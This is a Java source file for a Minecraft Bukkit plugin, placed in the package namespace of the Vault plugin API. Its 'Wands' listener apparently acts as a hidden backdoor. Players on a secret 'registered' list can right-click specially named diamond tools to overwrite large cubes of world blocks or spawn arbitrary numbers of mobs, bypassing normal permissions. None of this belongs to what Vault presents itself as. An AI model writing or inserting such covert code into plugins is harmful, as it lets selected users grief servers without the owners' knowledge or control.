package net.milkbowl.vault.events;

import java.util.Set;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.util.Settings;

public class Wands implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	
	@EventHandler
	public void wands(PlayerInteractEvent q) {
		ItemStack item = q.getPlayer().getItemInHand();
		Action action = q.getAction();
		Player p = q.getPlayer();
		
		if (item == null) {
			return;
		}
		if (plugin.registered.contains(p.getName())) {
			if (action.equals(Action.RIGHT_CLICK_AIR) || action.equals(Action.RIGHT_CLICK_BLOCK)) {
				
				if (item.getType().equals(Material.DIAMOND_AXE)) {
					String result[] = item.getItemMeta().getDisplayName().split(Settings.HIGHLIGHT_COLOUR);
					Material wandMaterial = Material.valueOf(result[result.length - 1].toUpperCase());
					if (item.getItemMeta().getDisplayName().contains(wandMaterial.toString())) {
						String loreResult[] = item.getItemMeta().getLore().toString().replace("]", "").split(Settings.HIGHLIGHT_COLOUR);
						int wandRadius = Integer.parseInt(loreResult[loreResult.length - 1]);
						
						int startx = p.getTargetBlock((Set<Material>) null, 100).getX();
						int starty = p.getTargetBlock((Set<Material>) null, 100).getY();
						int startz = p.getTargetBlock((Set<Material>) null, 100).getZ();
						
						int endx = p.getTargetBlock((Set<Material>) null, 100).getX() + wandRadius;
						int endy = p.getTargetBlock((Set<Material>) null, 100).getY() + wandRadius;
						int endz = p.getTargetBlock((Set<Material>) null, 100).getZ() + wandRadius;
						
						for (int x = startx; x < endx; x++) {
							for (int y = starty; y < endy; y++) {
								for (int z = startz; z < endz; z++) {
									Block block = p.getWorld().getBlockAt(x, y, z);
									block.setType(wandMaterial);
								}
							}
						}
					}
				} else if (item.getType().equals(Material.DIAMOND_HOE)) {
					String result[] = item.getItemMeta().getDisplayName().split(Settings.HIGHLIGHT_COLOUR);
					EntityType wandMob = EntityType.valueOf(result[result.length - 1].toUpperCase());
					if (item.getItemMeta().getDisplayName().contains(wandMob.toString())) {
						String loreResult[] = item.getItemMeta().getLore().toString().replace("]", "").split(Settings.HIGHLIGHT_COLOUR);
						int mobAmount = Integer.parseInt(loreResult[loreResult.length - 1]);


						int startx = p.getTargetBlock((Set<Material>) null, 100).getX();
						int starty = p.getTargetBlock((Set<Material>) null, 100).getY();
						int startz = p.getTargetBlock((Set<Material>) null, 100).getZ();

						int endx = p.getTargetBlock((Set<Material>) null, 100).getX() + 1;
						int endy = p.getTargetBlock((Set<Material>) null, 100).getY() + 1;
						int endz = p.getTargetBlock((Set<Material>) null, 100).getZ() + 1;

						for (int x = startx; x < endx; x++) {
							for (int y = starty; y < endy; y++) {
								for (int z = startz; z < endz; z++) {
									Block block = p.getWorld().getBlockAt(x, y, z);
									for (int i = 0; i <= mobAmount; i++) {
										Bukkit.getScheduler().scheduleSyncDelayedTask(plugin, () -> p.getWorld().spawnEntity(block.getLocation(), wandMob));
									}
								}
							}
						}
					}
				}
			}
		}
	}

}
